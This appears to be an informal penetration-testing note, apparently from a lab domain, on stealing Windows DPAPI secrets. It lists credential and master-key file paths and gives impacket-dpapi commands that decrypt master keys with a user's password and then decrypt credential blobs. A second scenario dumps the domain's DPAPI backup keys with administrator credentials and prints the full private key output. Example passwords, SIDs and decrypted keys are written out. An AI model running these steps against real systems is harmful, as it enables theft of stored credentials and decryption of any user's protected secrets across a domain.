





`C:\Users\Administrator\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D`

`C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-3115080475-3422209674-2867084633-500`

`C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-3115080475-3422209674-2867084633-500\7e52ba17-5180-486c-94fa-9d87425b6a90`



we will decrypt the master key using the users password
```
impacket-dpapi masterkey -file <master_key> -sid <SID> -password 'Password'
```

from this output we should be able to see the master_key and the n

```
impacket-dpapi credential -file <CREDENTIAL_BLOB> -key 'DECRYPTED_MASTERKEY'
```

Boom! ez pass :))


Example:

```
impacket-dpapi masterkey -file dd1d191a-dc9b-4d60-8870-bbe0f041a3b9 -sid S-1-5-21-3208886066-3809316082-4143998704-1116 -password 'I_d0nTL1ke#W1nd0wS!'
```


```
impacket-dpapi credential -file 3DE49F4606FFADA3457DB052E968C003 -key '0x30b6d35ffe0bf111c1efc2fbf9e9ed750bdf160f03a122bdeb9714fdd11c8ddc4aa5eebfc24dff06f0ef41573b04e3ff8e5a42c8b05858d7b0cc1f5becc68918'
```


## Scenario 2

## YOU HAVE ADMIN RIGHTS. EZ LIFE EZ WIN

use the backup_key to just decrypt everything, you can use impacket-dpapi


```
kali@kali ~> impacket-dpapi backupkeys -t MARVEL.local/administrator:'P@$$w0rd!'@192.168.78.129
Impacket v0.11.0 - Copyright 2023 Fortra

Preferred key:

PVK_FILE_HDR
dwMagic: {2964713758}
dwVersion: {0}
dwKeySpec: {1}
dwEncryptType: {0}
cbEncryptData: {0}
cbPvk: {1172}
PRIVATEKEYBLOB:{1ef1b5b000000000010000000000000000000000940400000702000000a40000525341320008000001000100bd088c325a3326c7eb1278df56fe5a5dbd1a543ed3e32d3125d9eedca2274f865966fb9d609b92398bf50d4db79e104923a1615df7f52e61d556b369eebff327dd33e28f57b0fcaec0a7fa24dd06bddf130eae0614ce828b1cb4e49b1c41edbdb70d50d90ce6252d94936612facc1ad652b3de99416953bb1bb873e5a0af0e2887a097eef542fcab009a8698c079200497bd95a8e447d34e2cf6082bd2afd31dd66ace8d1ee93498766172e9fc3e0d18265571d95c19c0cce3c66f3311826d2345e4929d1bcbeb1cce2c25e3b9fd418b03f2d96a2c6b463c0bbbe26370f93003b8c1c82f2f13a9f07ec7fd723cb67868e451d467ec2498cdec1db8c91855c8e833e233afa710768e70dd876fc7428eddd23de06e15971d922cc6a725eb41cce5dd5298819f3aa5f771a2535d5d65a58d2126423411ec25492a6b98c57f454b46cf91ba52d9e6912f3668d7fa6ec7edcc20021a15b21882a72cab851e4e78db9464207d5e52b8decfdc9d4362412620ec45524e97110fb9b5f7e09020d80c49f44fd904ea62294ad061c6306c3738df37b5e84c558ed5049181458bec28d5cc84d1de988780053e60ec7f7ace60488160114a0e317d0e026e0f13d98644a208ed10a7ffeb99ee25f33614004f0d5e1dc7eae4f067407fd0ad7399ca904a61765fd5b13fbcba8969670862bb9d764d24fcd2666a497c4355aff9edc458a811f2f37d9e17f6185bc4de61c7d19fa05c26fadcb4874cf4bb539b4504b1e3473e82cdbf7512b260b2d3950e3eb949e2c8871294c19fe356146f7a06e08991d0e0a8291dfe4679df0a7f30711089a5e46511e251ed67967cc2677ed016d367fa3278a6318bab368ffe6b14e51daa5d84b42a2d661d31751855e6116d0eb87bdf7c5fb22557016336a510666af6b2c38e491d369d62f16a1181d8ca667343f9509002cdd767ff098aa31284a43fb59a8aed2176ef4d5e565e2fc7d5e75cb901bc4a6b06619c0506c48e974e0b7f3ac444160d15e86aa1d1691ef94772eee2b2e65c0d39ebf3a816fdb8fcfd7505a02c2251f67f85bc5f84c7286eb7c9c629ef1ca85b0fc38fcef92d17dcef6f3a226bd97e0d5a27ba131ee79f8eff936ae0e48d598f679859174aefa61d5c9f0f6909830c64a03408707eff537fbef52b90c41886d3009840d75c196e9da1dc9d50da70950d970dcd9ddbe89bc2ec35116eee7d4bde845d6fa8145bb654334239d86f38042cc6b7bfc5f3926990254f31a0f7670d7c98bd95b0f965fa79772dd426912fe8f078b61b707242bb029d4d21883407b852497085102ca3ee5d51250838e571193c08cfe21ba412ccdc7773a61c4c8fb6801fd8acfb1ded05e14743aafc237e4bd5c944b057fb275f62dff79eab2832597b84d6b0225784bb345eea38c50f1eaea27486a1570913f496f3320f1dcbad3e403991bbb5a6e2905a9d3fea5b5ed50b93143c13fe4819bf69d42821250ad67e3b1fc3d09ed7580b2b94e61e23fe3e8fe10be5c2ff028494f5a6d7c573b0202129abe00df8e18adbda45de0c88514b551c55734d71a68f2b613c4519f507f79d5c01346af11f091696aef7e04a9bee61db073cb9ce1925393d4bb2fbf47e9fc8b83d}


Legacy key:
0x64ff04edaf41c208243a722c97c0f96315cb3bd8bbed9b8273d381665d351e12107170e297edef2abdb4ec14e31d1be061908d6b9ad7d9042ad186deb9bf80c9b8ae3e7a0fccf633585a656abeddb726c453dea31d7dd1a8a79f4039b115cd07ec1e8eab367ac54ccc13fe2b10cd67b600b74a7d8e5d97df098e0cf14a503e50221d1155a63205fdc4c9b30b24850e932a881ce792dfceabb78080c5c353063f86842148f5831f1edf51a55faf034ca0abaf3ed967457813e2a2638bcc3695064620edcc5743b5a98f0e79507267acf88845342f72f072bf34856b102b48ce66c54fcd2d9cc87c1099fda8f09360f71e9454c40d1a7aa410b3e67356adacd830

```

now this decrypted key and just decrypt ANYTHING we want